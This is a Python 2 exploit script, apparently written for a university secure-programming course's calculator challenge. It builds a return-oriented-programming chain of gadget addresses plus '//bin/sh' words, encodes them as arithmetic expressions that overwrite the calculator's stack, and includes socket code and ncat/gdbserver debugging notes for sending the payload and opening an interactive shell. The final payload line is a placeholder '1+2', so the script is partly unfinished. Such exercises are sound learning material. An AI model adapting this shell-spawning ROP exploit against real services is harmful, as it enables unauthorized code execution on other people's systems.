#!/usr/bin/python2

import struct
from socket import *
import telnetlib
import re

"""
0x080bc4f6 : pop esp ; ret
0x080908d0 : mov eax, 7 ; ret
0x08090850 : add eax, 3 ; ret
0x08090840 : add eax, 1 ; ret
0x0807cb7f : inc eax ; ret
0x080915e8 : add esp, 0xc ; ret
0x08049a21 : int 0x80
0x08058107 : nop ; ret
0x69622f2f
0x68732f6e // binsh
0x00000000


0x08058107 : nop ; ret
"""
g = [
0x080bc4f6, \
0x080908d0 , \
0x08090850 , \
0x08090840 , \
0x0807cb7f , \
0x080915e8 , \
0x080481d1 , \
0x08049a21 , \
0x08059107, \
0x69622f2f, \
0x68732f6e , \
0x00000000]


payload = ""
c = 0x8049499
for i, gg in enumerate(g):
    c = gg - abs(c)
    payload += ("+{}{}{}".format(i+361, "+" if c > 0 else "", c))


print(payload)

# try to run the program with gdbserver:5566 over ncat
# bind the programe port to 10042
# ncat -vc 'gdbserver localhost:5566 ./calc.exe' -kl 10042

# attach to the gdb server
# gdb-peda$ target remote localhost:5566

ip = 'secprog.cs.nctu.edu.tw'
ip = 'localhost'
port = 10042
soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))

payload = "1+2"
soc.send(payload)
print("sent")




## get interactive shell
#t = telnetlib.Telnet()
#t.sock = soc
#t.interact()

